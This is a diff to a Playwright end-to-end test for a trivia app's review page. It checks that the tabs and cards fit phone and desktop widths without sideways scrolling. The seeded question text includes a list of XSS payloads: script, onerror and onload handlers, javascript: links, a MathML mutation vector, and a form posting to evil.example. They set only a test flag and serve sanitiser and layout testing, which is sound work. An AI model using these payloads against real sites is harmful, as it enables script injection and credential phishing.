@@ -3,6 +3,7 @@ import { FirebaseBackend } from '../../fixtures/firebase-backend';
 import { expect, test } from '../../fixtures/test';
 import { signInViaUi } from '../../support/auth';
 import { answerQuestion } from '../../support/game';
+import { expectBoxUnmoved, expectNoSidewaysScroll, settledBox } from '../../support/layout';
 import { stubOpenTrivia } from '../../support/open-trivia';
 import { addQuestionTopic, runTag, startTopicGame } from '../../support/topics';
 
@@ -26,6 +27,28 @@ import { addQuestionTopic, runTag, startTopicGame } from '../../support/topics';
  * test alone — which is what makes the custom game below deterministic rather
  * than a draw from whatever the bank happens to hold (`e2e/support/topics.ts`).
  */
+/**
+ * Markup typed as text into a Markdown question — the lines of the sanitiser
+ * payload `markdown-rendering.spec.ts` seeds, word for word, sentinel
+ * included. Escaped, it is a run of long words with no break opportunity in
+ * them, the shape that widened a review card past a 320px window.
+ */
+const FIRE = 'window.__xssFired = true';
+const TYPED_MARKUP = [
+  `<script>${FIRE}</script>`,
+  `<img src=x onerror="${FIRE}">`,
+  `<svg onload="${FIRE}"></svg>`,
+  `<iframe src="data:text/html,<script>${FIRE}</script>"></iframe>`,
+  `<form action="https://evil.example"><input name="p"><button>go</button></form>`,
+  `<p style="position:fixed;inset:0;z-index:99">covering everything</p>`,
+  `<math><mi href="//evil.example">m</mi><annotation-xml encoding="text/html"><img src=x onerror="${FIRE}"></annotation-xml></math>`,
+  `<a href="javascript:${FIRE}">raw anchor</a>`,
+  `[markdown link](javascript:${FIRE})`,
+].join('\n');
+
+/** One word longer than a phone's line, with nowhere to break it. */
+const LONG_WORD = 'Pneumonoultramicroscopicsilicovolcanoconiosis';
+
 test.describe('the review queue', () => {
   const password = 'Password123!';
 
@@ -106,6 +129,136 @@ test.describe('the review queue', () => {
     await reviewTab(page, 'approved').click();
     await expect(page.getByText(pendingText)).toBeVisible();
   });
+
+  /**
+   * The page fits its window, whichever tab is chosen. The four tabs in one
+   * row are 382px, wider than a phone's content box, so below `sm` they are
+   * two rows of two — and what a reader meets when they are not is the whole
+   * page scrolling sideways, so that is what is measured: the document's width
+   * against the window's, polled rather than read once (`CLAUDE.md` §4.6), on
+   * every tab, each anchored on a row of this test's own having rendered. The
+   * Reports tab carries a report whose detail is one unbroken 500-character
+   * word, the longest the rules allow, which has to wrap inside its card. The
+   * tabs are measured across all four choices too, because choosing one must
+   * not resize the control just pressed (`CLAUDE.md` §4.4) — at 1280 as well,
+   * where they are one row sized by their labels and a state that changed a
+   * label's width would move its neighbours.
+   *
+   * Resized after signing in, not before: the auth menu has no business being
+   * driven at a width it is not otherwise tested at, and `/review` is then
+   * loaded fresh at the window's size.
+   */
+  for (const viewport of [
+    { width: 320, height: 640 },
+    { width: 390, height: 844 },
+    { width: 1280, height: 800 },
+  ]) {
+    test(`fits a ${viewport.width}px window on every tab, without scrolling sideways`, async ({
+      page,
+      firebase,
+    }) => {
+      const rejectedText = `Was this question turned down? (${tag})`;
+      const markupText = `Which markup was typed here? (${tag})`;
+      const wordText = `Is ${LONG_WORD} one word? (${tag})`;
+      await firebase.seedCustomQuestions([
+        {
+          id: `rejected-${tag}`,
+          tags: [topic],
+          type: 'multiple',
+          difficulty: 'easy',
+          question: rejectedText,
+          correct_answer: 'Yes',
+          incorrect_answers: ['No', 'Maybe', 'Unsure'],
+          createdBy: 'someone-else',
+          createdAt: Date.now(),
+          status: 'rejected',
+        },
+        // Question text with words that cannot wrap, in both of the
+        // renderer's branches: markup typed into a Markdown question, which is
+        // a run of long unbroken words once escaped, and one long word in a
+        // plain one. Both are approved, so the Approved tab carries them.
+        {
+          id: `approved-${tag}-markup`,
+          tags: [topic],
+          type: 'multiple',
+          difficulty: 'easy',
+          question: `${markupText}\n\n${TYPED_MARKUP}`,
+          format: 'markdown',
+          correct_answer: 'Yes',
+          incorrect_answers: ['No', 'Maybe', 'Unsure'],
+          createdBy: 'someone-else',
+          createdAt: Date.now(),
+          status: 'approved',
+        },
+        {
+          id: `approved-${tag}-word`,
+          tags: [topic],
+          type: 'multiple',
+          difficulty: 'easy',
+          question: wordText,
+          correct_answer: 'Yes',
+          incorrect_answers: ['No', 'Maybe', 'Unsure'],
+          createdBy: 'someone-else',
+          createdAt: Date.now(),
+          status: 'approved',
+        },
+      ]);
+      // The ID keeps the `{window}-{slot}-{uid}` shape, in the current window,
+      // so the report sorts onto the tab's first page.
+      const now = Date.now();
+      await firebase.seedQuestionReports([
+        {
+          id: `${Math.floor(now / 300_000)}-00-${tag}`,
+          questionId: `pending-${tag}`,
+          reason: 'other',
+          detail: 'Unbrokenreportdetail'.repeat(25),
+          reportedBy: `seed-${tag}`,
+          createdAt: now,
+        },
+      ]);
+
+      await signInAsReviewer(page, firebase);
+      await page.setViewportSize(viewport);
+      await page.goto('/review');
+      await expect(myRows(page)).toHaveCount(1);
+      await expect(reviewTab(page, 'pending')).toHaveAttribute('aria-checked', 'true');
+      await expectNoSidewaysScroll(page, `/review's Pending tab at ${viewport.width}px`);
+
+      // What each tab has to have rendered before its width means anything —
+      // on Approved, the Markdown question as Markdown rather than the source
+      // text the renderer shows until its engine arrives.
+      const anchors: Record<'pending' | 'approved' | 'rejected' | 'reports', () => Promise<void>> =
+        {
+          approved: async () => {
+            await expect(myRows(page).filter({ hasText: approvedText })).toHaveCount(1);
+            await expect(myRows(page).filter({ hasText: wordText })).toHaveCount(1);
+            await expect(
+              myRows(page).filter({ hasText: markupText }).getByTestId('rendered-text').first(),
+            ).toHaveAttribute('data-rendered', 'markdown');
+          },
+          rejected: async () => {
+            await expect(myRows(page).filter({ hasText: rejectedText })).toHaveCount(1);
+          },
+          reports: async () => {
+            await expect(
+              page.getByTestId('review-report').filter({ hasText: pendingText }),
+            ).toHaveCount(1);
+          },
+          pending: async () => {
+            await expect(myRows(page).filter({ hasText: pendingText })).toHaveCount(1);
+          },
+        };
+      const tabs = page.getByTestId('review-tabs');
+      const box = await settledBox(tabs, `the tabs at ${viewport.width}px`);
+      for (const view of ['approved', 'rejected', 'reports', 'pending'] as const) {
+        await reviewTab(page, view).click();
+        await expect(reviewTab(page, view)).toHaveAttribute('aria-checked', 'true');
+        await anchors[view]();
+        await expectNoSidewaysScroll(page, `/review's ${view} tab at ${viewport.width}px`);
+        await expectBoxUnmoved(tabs, box, `the tabs with ${view} chosen, at ${viewport.width}px`);
+      }
+    });
+  }
 
   /**
    * The answer almost every account gets, so it has to arrive as an answer and
